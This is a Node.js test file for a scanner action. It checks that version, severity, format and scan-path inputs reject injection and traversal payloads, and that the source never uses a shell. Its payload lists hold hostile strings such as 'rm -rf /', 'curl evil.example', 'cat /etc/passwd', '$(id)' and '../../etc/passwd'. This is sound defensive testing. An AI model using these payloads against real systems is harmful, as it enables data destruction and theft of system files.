'use strict';

/**
 * Adversarial input tests. Every payload here is a classic command injection,
 * option injection or path traversal attempt. None of them may reach npm,
 * the scanner, or the filesystem outside the workspace: validation must
 * reject them all before anything executes.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const os = require('node:os');
const path = require('node:path');
const fs = require('node:fs');

const { InputError, validateVersion, validateScanPath, validateSeverity, validateFormat } = require('../src/inputs.cjs');

const COMMAND_INJECTION_PAYLOADS = [
  '0.2.0; rm -rf /',
  '0.2.0 && curl evil.example',
  '0.2.0 | cat /etc/passwd',
  '0.2.0`id`',
  '0.2.0$(id)',
  '0.2.0\nrm -rf /',
  '0.2.0\rm -rf /',
  '0.2.0 --registry=https://evil.example',
  '0.2.0 --install-scripts',
  '0.2.0 @evil/package',
  ';0.2.0',
  '0.2.0\v',
];

test('command and option injection payloads in the version input are rejected', () => {
  for (const payload of COMMAND_INJECTION_PAYLOADS) {
    assert.throws(() => validateVersion(payload), InputError, `expected rejection of ${JSON.stringify(payload)}`);
  }
});

test('enum injection payloads in severity and format are rejected', () => {
  for (const payload of ['warning; rm -rf /', 'warning$(id)', 'warning`id`', 'warning\nextra']) {
    assert.throws(() => validateSeverity(payload), InputError);
    assert.throws(() => validateFormat(payload), InputError);
  }
});

test('path traversal payloads in the scan path are rejected', () => {
  const workspace = fs.mkdtempSync(path.join(os.tmpdir(), 'sla-injection-'));
  try {
    const payloads = [
      '..',
      '../..',
      '../../etc/passwd',
      'src/../../../../etc/passwd',
      '..\\..\\windows\\system32',
      'src/../../..',
    ];
    for (const payload of payloads) {
      assert.throws(() => validateScanPath(payload, workspace), InputError, `expected rejection of ${payload}`);
    }
    const absoluteOutside = process.platform === 'win32' ? 'C:\\Windows\\System32' : '/etc/passwd';
    assert.throws(() => validateScanPath(absoluteOutside, workspace), InputError);
  } finally {
    fs.rmSync(workspace, { recursive: true, force: true });
  }
});

test('no source file uses a shell or string concatenated command execution', () => {
  const srcDir = path.join(__dirname, '..', 'src');
  const files = fs.readdirSync(srcDir).filter((file) => file.endsWith('.cjs'));
  assert.ok(files.length >= 4, 'expected the source modules to exist');
  for (const file of files) {
    const source = fs.readFileSync(path.join(srcDir, file), 'utf8');
    assert.ok(!source.includes('shell: true') && !source.includes('shell:true'), `${file} must not enable a shell`);
    assert.ok(!/\bexecSync\s*\(/.test(source), `${file} must not use execSync`);
    assert.ok(!/\bexec\s*\(/.test(source), `${file} must not use exec`);
    assert.ok(!/\bspawnSync\s*\(/.test(source), `${file} must not use spawnSync`);
    assert.ok(!/\bspawn\s*\(/.test(source), `${file} must not use spawn`);
  }
});

test('every child process execution goes through execFileSync with an argument array', () => {
  const srcDir = path.join(__dirname, '..', 'src');
  const files = fs.readdirSync(srcDir).filter((file) => file.endsWith('.cjs'));
  let execFileSites = 0;
  for (const file of files) {
    const source = fs.readFileSync(path.join(srcDir, file), 'utf8');
    const matches = source.match(/execFileSync\s*\(/g);
    if (matches) execFileSites += matches.length;
  }
  // The scanner binary is the only child process in the action; the package
  // itself is downloaded and extracted in process, never through a package
  // manager, so no second exec site may ever appear.
  assert.equal(execFileSites, 1, 'the scanner must be the only child process execution site');
});

test('the scan module passes fail-on as a literal validated value', () => {
  const source = fs.readFileSync(path.join(__dirname, '..', 'src', 'scan.cjs'), 'utf8');
  assert.ok(source.includes("'--fail-on'"), 'scan must pass the real --fail-on flag');
  assert.ok(!source.includes('`--fail-on ${'), 'fail-on must not be template concatenated into a flag string');
});

test('workflow files never interpolate inputs into shell script lines', () => {
  const action = fs.readFileSync(path.join(__dirname, '..', 'action.yml'), 'utf8');
  assert.ok(!action.includes('run:'), 'the node20 action must not contain shell run steps');
  const workflowsDir = path.join(__dirname, '..', '.github', 'workflows');
  for (const file of fs.readdirSync(workflowsDir)) {
    const content = fs.readFileSync(path.join(workflowsDir, file), 'utf8');
    const dangerous = content.match(/\$\{\{\s*inputs\./g);
    assert.ok(!dangerous, `${file} must not interpolate action inputs into scripts`);
  }
});
